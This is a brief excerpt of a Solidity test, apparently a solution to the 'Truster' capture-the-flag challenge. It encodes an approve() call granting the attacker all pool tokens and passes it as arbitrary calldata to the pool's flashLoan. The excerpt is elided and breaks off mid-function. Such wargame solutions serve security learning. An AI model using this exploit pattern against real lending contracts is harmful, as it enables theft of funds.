...
contract Truster is Test {
    ...
    function testExploit() public {
        ...
        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(attacker), TOKENS_IN_POOL);
        trusterLenderPool.flashLoan(0, address(this), address(dvt), approvePayload);
